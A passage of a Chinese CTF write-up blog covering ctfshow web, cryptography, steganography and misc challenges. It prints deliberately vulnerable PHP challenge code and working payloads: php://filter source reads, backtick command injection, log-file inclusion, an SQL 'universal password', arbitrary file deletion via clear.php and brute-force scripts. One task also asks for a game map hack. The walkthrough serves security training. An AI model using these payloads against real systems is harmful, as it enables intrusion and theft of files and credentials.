bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># include + 伪协议</span></span><br><span class="line">?c=include<span class="variable">$_GET</span>[1]?&gt;&amp;1=php://filter/<span class="built_in">read</span>=convert.base64-encode/resource=config.php</span><br><span class="line"></span><br><span class="line">?c=<span class="built_in">echo</span> `<span class="variable">$_GET</span>[a]`?&gt;&amp;a=tac config.php</span><br></pre></td></tr></table></figure><h2 id="Web-15-—-过滤"><a href="#Web-15-—-过滤" class="headerlink" title="Web 15 — 过滤 ?"></a>Web 15 — 过滤 ?</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="comment"># flag in config.php</span></span><br><span class="line">include(<span class="string">&quot;config.php&quot;</span>);</span><br><span class="line"><span class="keyword">if</span>(isset(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">        <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">        <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/system|\\*|\?|\&lt;|\&gt;|\=|exec|highlight|cat|\(|\.|file|php|config/i&quot;</span>,<span class="variable">$c</span>))&#123;</span><br><span class="line">                <span class="built_in">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            die(<span class="string">&quot;cmd error&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p><strong>过滤问号 ?</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?c=<span class="built_in">echo</span> `<span class="variable">$_GET</span>[a]`;&amp;a=tac config.php</span><br><span class="line">?c=include<span class="variable">$_GET</span>[1];&amp;1=php://filter/<span class="built_in">read</span>=convert.base64-encode/resource=config.php</span><br></pre></td></tr></table></figure><h2 id="Web-16"><a href="#Web-16" class="headerlink" title="Web 16"></a>Web 16</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="comment"># flag in config.php</span></span><br><span class="line">include(<span class="string">&quot;config.php&quot;</span>);</span><br><span class="line"><span class="keyword">if</span>(isset(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">        <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">        <span class="keyword">if</span>(md5(<span class="string">&quot;ctfshow<span class="variable">$c</span>&quot;</span>)===<span class="string">&quot;a6f57ae38a22448c2f07f3f95f49c84e&quot;</span>)&#123;</span><br><span class="line">            <span class="built_in">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="built_in">echo</span> <span class="string">&quot;nonono!&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>脚本：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">import hashlib</span><br><span class="line">str1=<span class="string">&#x27;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> str1:</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> str1:</span><br><span class="line">        <span class="keyword">for</span> k <span class="keyword">in</span> str1:</span><br><span class="line">            s = hashlib.md5((<span class="string">&#x27;ctfshow&#x27;</span>+i+j+k).encode()).hexdigest()</span><br><span class="line">            <span class="comment">#print(type(s))</span></span><br><span class="line">            <span class="keyword">if</span> s==<span class="string">&#x27;a6f57ae38a22448c2f07f3f95f49c84e&#x27;</span>:</span><br><span class="line">                <span class="built_in">print</span>(i+j+k)</span><br></pre></td></tr></table></figure><p>得到 36d</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=36d</span><br></pre></td></tr></table></figure><h2 id="Web-17-21-—-日志包含"><a href="#Web-17-21-—-日志包含" class="headerlink" title="Web 17-21 — 日志包含"></a>Web 17-21 — 日志包含</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="keyword">if</span>(isset(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">       <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">       <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/php/i&quot;</span>,<span class="variable">$c</span>))&#123;</span><br><span class="line">               include(<span class="variable">$c</span>);</span><br><span class="line">       &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p><strong>日志包含</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=/var/<span class="built_in">log</span>/nginx/access.log</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/08/16/rN8xalpn9bUyQYC.png" alt="image-20210816170943818"></p><p><img src="https://i.loli.net/2021/08/16/JjBqbcYu4tSeZCR.png" alt="image-20210816170929174"></p><h2 id="Web-18"><a href="#Web-18" class="headerlink" title="Web 18"></a>Web 18</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="keyword">if</span>(isset(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">       <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">       <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/php|file/i&quot;</span>,<span class="variable">$c</span>))&#123;</span><br><span class="line">               include(<span class="variable">$c</span>);</span><br><span class="line">       &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><h2 id="密码1"><a href="#密码1" class="headerlink" title="密码1"></a>密码1</h2><p>密文：</p><p>53316C6B5A6A42684D3256695A44566A4E47526A4D5459774C5556375A6D49324D32566C4D4449354F4749345A6A526B4F48303D</p><p><a href="https://www.bejson.com/convert/ox2str/">十六进制到文本字符串</a></p><p><img src="https://i.loli.net/2021/08/17/37tyQmEvxOznSMe.png" alt="image-20210817123630323"></p><p>再 base64 解码</p><p>KYdf0a3ebd5c4dc160-E{fb63ee0298b8f4d8}</p><p><a href="https://www.qqxiuzi.cn/bianma/zhalanmima.php">栅栏密码解码</a></p><p><img src="https://i.loli.net/2021/08/17/EIhugz4SwcoKYAH.png" alt="image-20210817123823370"></p><h2 id="密码2"><a href="#密码2" class="headerlink" title="密码2"></a>密码2</h2><p>出题人已累，随便敲了几下键盘。。。 rdcvbg 2qase3 6tghu7</p><p>rdcvbg 2qase3 6tghu7</p><p>​    f             w            y</p><p>三组，包围</p><p>KEY{fwy}</p><h2 id="密码3"><a href="#密码3" class="headerlink" title="密码3"></a>密码3</h2><p>题目名称：我想吃培根 题目描述： – — .-. … . ..–.- .. … ..–.- -.-. — — .-.. ..–.- -… ..- - ..–.- -… .- -.-. — -. ..–.- .. … ..–.- -.-. — — .-.. . .-. ..–.- – – -.. -.. – -.. – -.. – – – -.. -.. -.. /– -.. – -.. -.. –/ – – – – – /– -.. -.. – -.. – /– -.. -.. – </p><p>格式：flag{***********}</p><p><a href="http://moersima.00cha.net/">摩斯密码解密</a></p><p><img src="https://i.loli.net/2021/08/17/Wu86T7wcbpKENGS.png" alt="image-20210817124449077"></p><p>得到  mmddmdmdmmmdddmdmddmmmmmmmddmdmmddm</p><p>将 m 替换成 A，d 替换成 B  ，AABBABABAAABBBABABBAAAAAAABBABAABBA</p><p><a href="http://rumkin.com/tools/cipher/baconian.php">培根密码解密</a></p><p><img src="https://i.loli.net/2021/08/17/LYK8a6bdl7PXJCV.png" alt="image-20210817124828352"></p><h2 id="密码-4"><a href="#密码-4" class="headerlink" title="密码#4"></a>密码#4</h2><p>QW8obWdIWF5FKUFSQW5URihKXWZAJmx0OzYiLg==</p><p>base64 得到 Ao(mgHX^E)ARAnTF(J]f@&lt;6”.</p><p>然后 <a href="http://ctf.ssleye.com/base85.html">base85</a></p><p><img src="https://i.loli.net/2021/08/17/oYHs4R3jJpMWIAv.png" alt="image-20210817125211103"></p><h2 id="隐写1"><a href="#隐写1" class="headerlink" title="隐写1"></a>隐写1</h2><p>下载到本地，打不开</p><p>010 查看，文件头损坏</p><p><img src="https://i.loli.net/2021/08/17/P4ovewZGTFLhA2I.png" alt="image-20210817181956643"></p><p>更改为 89 后保存，打开即可</p><h2 id="隐写2"><a href="#隐写2" class="headerlink" title="隐写2"></a>隐写2</h2><p>下载工具，打开图片，点击 Seek ，密码为空，保存，得到所解出的密文</p><p><img src="https://i.loli.net/2021/08/17/or8TfdwiM2mlnUY.png" alt="image-20210817183021842"></p><h2 id="萌新-隐写2-—-zip-伪加密-ziperello-暴力破解"><a href="#萌新-隐写2-—-zip-伪加密-ziperello-暴力破解" class="headerlink" title="萌新 隐写2 — zip 伪加密 ziperello 暴力破解"></a>萌新 隐写2 — zip 伪加密 ziperello 暴力破解</h2><p><img src="https://i.loli.net/2021/08/17/lGEF96pw4gOLsfh.png" alt="image-20210817183327452"></p><p>zip 伪加密 ziperello 工具</p><p><img src="https://i.loli.net/2021/08/17/PDVweJF4S86xgUA.png" alt="image-20210817184618928"></p><p><img src="https://i.loli.net/2021/08/17/H6Cgfo5kdBIj9wu.png" alt="image-20210817184906246"></p><p>伪加密是09，这里是01，是真有密码。</p><h2 id="萌新-隐写3"><a href="#萌新-隐写3" class="headerlink" title="萌新 隐写3"></a>萌新 隐写3</h2><p><img src="https://i.loli.net/2021/08/17/gkKmvdftDxL9Wze.png" alt="image-20210817185117999"></p><h2 id="萌新-隐写4-—-doc"><a href="#萌新-隐写4-—-doc" class="headerlink" title="萌新 隐写4 — .doc"></a>萌新 隐写4 — .doc</h2><p><img src="https://i.loli.net/2021/08/17/UOcV19hzEuKBLg3.png" alt="image-20210817185432792"></p><p>打开之后，可以看见存在换行，在 word 选项中设置 显示隐藏文字</p><p><img src="https://i.loli.net/2021/08/17/TbIxswakcjGznpg.png" alt="image-20210817185525227"></p><p><img src="https://i.loli.net/2021/08/17/9BRSyYAtN8LKFhg.png" alt="image-20210817185557410"></p><h2 id="萌新-隐写5"><a href="#萌新-隐写5" class="headerlink" title="萌新 隐写5"></a>萌新 隐写5</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">䴀娀圀䜀䌀娀娀䤀一䈀儀圀㘀堀㌀䬀一䘀㈀嘀㘀夀吀嘀䰀㔀㐀圀㘀㌀吀䠀䰀㔀刀䐀䜀䴀匀㜀䘀䔀㴀㴀㴀㴀㴀㴀\\=。=//</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/08/17/bIjpZQl4BOWaeNG.png" alt="image-20210817185848751"></p><p><img src="https://i.loli.net/2021/08/17/W5IjJqcSChwnm9d.png" alt="image-20210817185922758"></p><p>MZWGCZZINBQW6X3KNF2V6YTVL54W63THL5RDGMS7FE======</p><p>base32</p><h2 id="萌新6-—-flac-音频-—-audacity-工具"><a href="#萌新6-—-flac-音频-—-audacity-工具" class="headerlink" title="萌新6 — .flac 音频 — audacity 工具"></a>萌新6 — .flac 音频 — audacity 工具</h2><p><img src="https://i.loli.net/2021/08/17/bLpFINq2R8olt6x.png" alt="image-20210817201257731"></p><p>左声道 样子像 摩斯电码</p><p>将右声道设置为静音，提高音量，导出为 Mp3</p><p><img src="https://i.loli.net/2021/08/17/B9aT5KnhpHCqksz.png" alt="image-20210817201422588"></p><p>打开 <a href="https://morsecode.world/international/decoder/audio-decoder-adaptive.html">摩斯电码音频解码工具</a></p><p><img src="https://i.loli.net/2021/08/17/SE9HhpjF38Arywc.png" alt="image-20210817201634242"></p><p>有误差 ，答案是 flag{MUZIKISG00D}</p><h2 id="杂项1"><a href="#杂项1" class="headerlink" title="杂项1"></a>杂项1</h2><p>小明想给心爱的妹子表白很久，可是不知道怎么开口，你能帮帮小明吗？</p><p>已知 md5(表白的话+ctf)=ed400fbcff269bd9c65292a97488168a</p><p>提交flag{表白的话}</p><p><a href="https://cmd5.la/user/index.php">https://cmd5.la/user/index.php</a></p><p><img src="https://i.loli.net/2021/08/17/mMPvgeCLOqrRS7h.png" alt="image-20210817203719294"></p><h2 id="杂项2"><a href="#杂项2" class="headerlink" title="杂项2"></a>杂项2</h2><p><img src="https://i.loli.net/2021/08/17/IqzhFbQX72HYLCm.png" alt="image-20210817204057302"></p><h2 id="萌新-杂项3"><a href="#萌新-杂项3" class="headerlink" title="萌新 杂项3"></a>萌新 杂项3</h2><p>大家好我是小萌新羽，前不久我的一个朋友给我了一张银行卡，他说里面有一大笔钱，但是他只告诉我他的生日是九七年十月一日，你能帮我猜猜他的银行卡密码是多少吗，哦对，这个朋友有个小名叫小五。</p><p>flag格式：flag{银行卡密码}</p><p>flag{971015}</p><h2 id="杂项4"><a href="#杂项4" class="headerlink" title="杂项4"></a>杂项4</h2><p>小明心爱的图片在压缩包中，可是小明夜深人静的时候，孤枕难眠，想打开图片排遣寂寞，可是忘记了密码了，小米依稀记得9位的密码都是数字，前3位是372，你能帮助小明吗？</p><p>zip 压缩包 </p><ul><li>ziperello 直接爆破得到密码</li></ul><p><img src="https://i.loli.net/2021/08/17/QILvVmMF8zhdAS7.png" alt="image-20210817205231263"></p><ul><li>ARCHPR 掩码</li></ul><p><img src="C:\Users\yinanping\AppData\Roaming\Typora\typora-user-images\image-20210817205050082.png" alt="image-20210817205050082"></p><h2 id="杂项5"><a href="#杂项5" class="headerlink" title="杂项5"></a>杂项5</h2><p>小明如愿以偿的打开了压缩包，可是眼前的文字自己只能认识FBI，其他的都不认识，而且屏幕出现了一句话，你能帮小明找到这句话的意思吗？</p><p><img src="https://i.loli.net/2021/08/17/qudxZoKW1PXUjE9.png" alt="image-20210817205505223"></p><p><img src="C:\Users\yinanping\AppData\Roaming\Typora\typora-user-images\image-20210817205640153.png" alt="image-20210817205640153"></p><h2 id="杂项6"><a href="#杂项6" class="headerlink" title="杂项6"></a>杂项6</h2><p>小明的压缩包又忘记密码了？他去电脑维修店去修，人家扔出来说这个根本就没有密码，是个假密码。小明懵了，明明有密码的啊，你能帮帮小明吗？</p><p>伪加密 ，将 09 替换成 00</p><p><img src="C:\Users\yinanping\AppData\Roaming\Typora\typora-user-images\image-20210817210106625.png" alt="image-20210817210106625"></p><h2 id="杂项7"><a href="#杂项7" class="headerlink" title="杂项7"></a>杂项7</h2><p>小明小心翼翼的打开压缩包，竟然是个图片，什么鬼？</p><p>要是图片能继续往长一点该多好啊，小明暗暗的想。</p><p>你能帮小明完成这个朴素的梦想吗？</p><p>图片 SRC</p><p><img src="https://i.loli.net/2021/08/17/XHLgEo1clnfyOBs.png" alt="image-20210817210418869"></p><p>计算图片正确的宽和高</p><p>脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"> </span><br><span class="line">m = <span class="built_in">open</span>(<span class="string">&quot;flag.png&quot;</span>,<span class="string">&quot;rb&quot;</span>).read()</span><br><span class="line">k=<span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5000</span>):</span><br><span class="line">    <span class="keyword">if</span> k==<span class="number">1</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5000</span>):</span><br><span class="line">        c = m[<span class="number">12</span>:<span class="number">16</span>] + struct.pack(<span class="string">&#x27;&gt;i&#x27;</span>, i) + struct.pack(<span class="string">&#x27;&gt;i&#x27;</span>, j)+m[<span class="number">24</span>:<span class="number">29</span>]</span><br><span class="line">        crc = binascii.crc32(c) &amp; <span class="number">0xffffffff</span></span><br><span class="line">        <span class="keyword">if</span> crc == <span class="number">0x889C2F07</span>:</span><br><span class="line">            k = <span class="number">1</span></span><br><span class="line">            <span class="built_in">print</span>(<span class="built_in">hex</span>(i),<span class="built_in">hex</span>(j))</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure><p><img src="C:\Users\yinanping\AppData\Roaming\Typora\typora-user-images\image-20210817210616232.png" alt="image-20210817210616232"></p><p><img src="C:\Users\yinanping\AppData\Roaming\Typora\typora-user-images\image-20210817210714567.png" alt="image-20210817210714567"></p><h2 id="杂项8"><a href="#杂项8" class="headerlink" title="杂项8"></a>杂项8</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">import struct</span><br><span class="line">import binascii</span><br><span class="line">import os</span><br><span class="line"> </span><br><span class="line">m = open(<span class="string">&quot;flag.png&quot;</span>,<span class="string">&quot;rb&quot;</span>).<span class="built_in">read</span>()</span><br><span class="line">k=0</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(5000):</span><br><span class="line">    <span class="keyword">if</span> k==1:</span><br><span class="line">        <span class="built_in">break</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(5000):</span><br><span class="line">        c = m[12:16] + struct.pack(<span class="string">&#x27;&gt;i&#x27;</span>, i) + struct.pack(<span class="string">&#x27;&gt;i&#x27;</span>, j)+m[24:29]</span><br><span class="line">        crc = binascii.crc32(c) &amp; 0xffffffff</span><br><span class="line">        <span class="keyword">if</span> crc == 0x889C2F07:</span><br><span class="line">            k = 1</span><br><span class="line">            <span class="built_in">print</span>(hex(i),hex(j))</span><br><span class="line">            <span class="built_in">break</span></span><br></pre></td></tr></table></figure><p>和杂项7一样，修改正确的宽高</p><p><img src="C:\Users\yinanping\AppData\Roaming\Typora\typora-user-images\image-20210817211616036.png" alt="image-20210817211616036"></p><h2 id="杂项9-—-链接失效-—-过"><a href="#杂项9-—-链接失效-—-过" class="headerlink" title="杂项9 — 链接失效 — 过"></a>杂项9 — 链接失效 — 过</h2><p>题目地址： 链接: <a href="https://pan.baidu.com/s/1XqF-OyHbH5WHFEUJvVZPEA">https://pan.baidu.com/s/1XqF-OyHbH5WHFEUJvVZPEA</a> 提取码: fcg3</p><p>要求：写一个本地外挂，小地图显示全图。</p><p>提示：游戏版本1.24E，修改game.dll</p><p>提交小地图全图基址即可。例如：flag{0xxxxxxx}</p><h2 id="杂项10"><a href="#杂项10" class="headerlink" title="杂项10"></a>杂项10</h2><p><img src="https://i.loli.net/2021/08/17/WkIsNA3Zd9oYrvD.png" alt="image-20210817212449610"></p><p>摘掉眼镜，仔细看图片</p><p>flag{我好喜欢你}</p><h2 id="杂项11"><a href="#杂项11" class="headerlink" title="杂项11"></a>杂项11</h2><p>密码为空，提取文件得到 1.jpg，一个二维码</p><p><img src="https://i.loli.net/2021/08/17/8oLmaJEkfY1U2yW.png" alt="image-20210817212951757"></p><p>使用 二维码扫描工具扫描，得到</p><p><img src="https://i.loli.net/2021/08/17/mInpy7OwPF9chWV.png" alt="image-20210817213220467"></p><p>base64 解码得到</p>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla</summary>
      
    
    
    
    <category term="CTF Show" scheme="https://xizhi-future.github.io/categories/CTF-Show/"/>
    
    
    <category term="CTF" scheme="https://xizhi-future.github.io/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>CTF-Show-黑盒测试</title>
    <link href="https://xizhi-future.github.io/2021/11/19/CTF-Show-%E9%BB%91%E7%9B%92%E6%B5%8B%E8%AF%95/"/>
    <id>https://xizhi-future.github.io/2021/11/19/CTF-Show-%E9%BB%91%E7%9B%92%E6%B5%8B%E8%AF%95/</id>
    <published>2021-11-19T07:14:09.000Z</published>
    <updated>2021-11-19T07:15:45.222Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h1 id="一、黑盒测试"><a href="#一、黑盒测试" class="headerlink" title="一、黑盒测试"></a>一、黑盒测试</h1><h2 id="1-1-Web-380"><a href="#1-1-Web-380" class="headerlink" title="1.1 Web 380"></a>1.1 Web 380</h2><p>扫目录可以发现</p><p><img src="https://i.loli.net/2021/08/04/oQUxOMAecNVramB.png" alt="image-20210804135546210"></p><p><img src="https://i.loli.net/2021/08/04/PHiK79wfyUxTWGe.png" alt="image-20210804135326954"></p><p>尝试 ?id=2</p><p><img src="https://i.loli.net/2021/08/04/pgPURTNBjht75o6.png" alt="image-20210804135348176"></p><p>可以看到是 <code>file_get_contents</code> </p><p>那 <code>?id=flag</code> 尝试 ，查源码得到</p><h2 id="1-2-Web-381"><a href="#1-2-Web-381" class="headerlink" title="1.2 Web 381"></a>1.2 Web 381</h2><p><img src="C:\Users\yinanping\AppData\Roaming\Typora\typora-user-images\image-20210804135637994.png" alt="image-20210804135637994"></p><p>可以看到这里与之前不同，但是尝试访问过后，依旧不行</p><p>那继续扫，发现，仍然得到了 <code>page.php</code></p><p><img src="https://i.loli.net/2021/08/04/lC5HYPfB4xVj9DE.png" alt="image-20210804140001237"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?id=1</span><br><span class="line">2 3 4</span><br><span class="line"><span class="comment"># 发现对应的是每一篇报道</span></span><br></pre></td></tr></table></figure><p>依次访问，最终无所获，且尝试过后 <code>page_flag.php</code> 应该也是不存在的</p><p>又回到最初发现的原密码目录，再次尝试，成功</p><p><img src="https://i.loli.net/2021/08/04/SrIFG9wsRJ6mzAQ.png" alt="image-20210804140511148"></p><h2 id="1-3-Web-382-383"><a href="#1-3-Web-382-383" class="headerlink" title="1.3 Web 382-383"></a>1.3 Web 382-383</h2><p>这次再直接访问过后，就是登录页面</p><p><img src="https://i.loli.net/2021/08/04/u5OVsHQIXcv7lBe.png" alt="image-20210804140652142"></p><p><strong>SQL 万能密码</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username: admin<span class="string">&#x27;or&#x27;</span>1<span class="string">&#x27;=&#x27;</span>1</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/08/04/JTAzCBqfjY9sahW.png" alt="image-20210804140903548"></p><p><strong>密码爆破</strong></p><p><img src="https://i.loli.net/2021/08/04/DW685jRtagGKIeb.png" alt="image-20210804141939521"></p><h2 id="1-4-Web-384"><a href="#1-4-Web-384" class="headerlink" title="1.4 Web 384"></a>1.4 Web 384</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">密码前2位是小写字母，后三位是数字</span><br></pre></td></tr></table></figure><p>万能密码不可行，只能根据题目进行爆破</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">str = <span class="string">&#x27;abcdefghigklmnopqrstuvwxyz&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> str:</span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> str:</span><br><span class="line"><span class="built_in">print</span>(i,j)</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/08/04/GK4kNicyxXmhBvV.png" alt="image-20210804144019115"></p><h2 id="1-5-Web-385"><a href="#1-5-Web-385" class="headerlink" title="1.5 Web 385"></a>1.5 Web 385</h2><p>同样有后台登录，但是密码也没有提示，我们先不进行爆破</p><p>扫目录，有新的发现</p><p><img src="https://i.loli.net/2021/08/04/TtuqMYQVP65XOe9.png" alt="image-20210804144556248"></p><p><img src="https://i.loli.net/2021/08/04/qeb5Y4MXhUW29KP.png" alt="image-20210804144644455"></p><p><img src="https://i.loli.net/2021/08/04/sGpZi9luOXMehTP.png" alt="image-20210804144714402"></p><p>证明我们已经重置了密码，那么 所谓的 默认密码是多少呢？</p><p>不管是多少，肯定是弱密码，我们可以再进行爆破，也可以结合之前所爆破出来的密码尝试</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin888</span><br></pre></td></tr></table></figure><h2 id="1-6-Web-386"><a href="#1-6-Web-386" class="headerlink" title="1.6 Web 386"></a>1.6 Web 386</h2><p>说是扫出来的 <code>clear.php</code> ，但是我 dirsearch 没有扫出来，说白了，还是字典不够强大</p><p><img src="https://i.loli.net/2021/08/04/XCiA4ofnjSg5YJM.png" alt="image-20210804145328318"></p><p>也就是说，我们需要首先清除掉 <code>lock.dat</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/clear.php?file=./install/lock.dat</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/08/04/FOypT7ZMeIN8i9U.png" alt="image-20210804150138828"></p><p>清理成功之后再次像上一关那样就好了</p><h2 id="1-7-Web-387"><a href="#1-7-Web-387" class="headerlink" title="1.7 Web 387"></a>1.7 Web 387</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">前面部分和386一样</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/08/04/jeDxClWqETONUgm.png" alt="image-20210804150816749"></p><p>说是和上一关一样，但是这次删不了，我们继续扫目录</p><p><img src="https://i.loli.net/2021/08/04/BS9COfTgGrAX2wY.png" alt="image-20210804150803918"></p><p><img src="https://i.loli.net/2021/08/04/gkam7jJ3xovDQ4Y.png" alt="image-20210804150901657"></p><p><img src="https://i.loli.net/2021/08/04/Ev3jVune7N5tgOb.png" alt="image-20210804150936797"></p><p>看来 robots.txt 也是用来提示我们 <code>/debug/</code> 的</p><p>尝试传递参数试试</p><p><img src="https://i.loli.net/2021/08/04/p4wzKtHeGEb8SuI.png" alt="image-20210804151150834"></p><p><img src="https://i.loli.net/2021/08/04/jRNg9zqTElSA6iP.png" alt="image-20210804151227962"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?file=php://filter/resource=flag.php</span><br><span class="line">?file=/flag</span><br><span class="line"><span class="comment">#等等都查不出来</span></span><br></pre></td></tr></table></figure><p>那么，进行日志包含</p><figure class="highlight bash"><table><tr><td 